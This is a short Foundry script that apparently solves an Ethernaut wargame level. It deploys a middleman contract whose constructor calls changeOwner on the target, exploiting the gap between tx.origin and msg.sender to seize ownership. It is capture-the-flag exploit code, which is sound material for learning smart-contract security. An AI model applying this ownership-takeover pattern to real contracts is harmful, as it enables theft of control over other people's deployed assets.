// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {EthernautL5} from "../src/EthernautL5.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract MiddleManContract {
    constructor(EthernautL5 _ethernautL5) {
        _ethernautL5.changeOwner(
            address(0xA86Ea1be0A43Ea977dd7489c7c91247B1a7bC50b)
        );
    }
}

contract EthernautL5Script is Script {
    EthernautL5 public ethernautl5 =
        EthernautL5(0x5C9370559F86dE80C7b837bd05015f08b23aaA8e);

    function run() external {
        // Check who is the owner of the contract
        address owner = ethernautl5.owner();
        console.log("Owner: ", owner);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new MiddleManContract(ethernautl5);
        vm.stopBroadcast();
    }
}
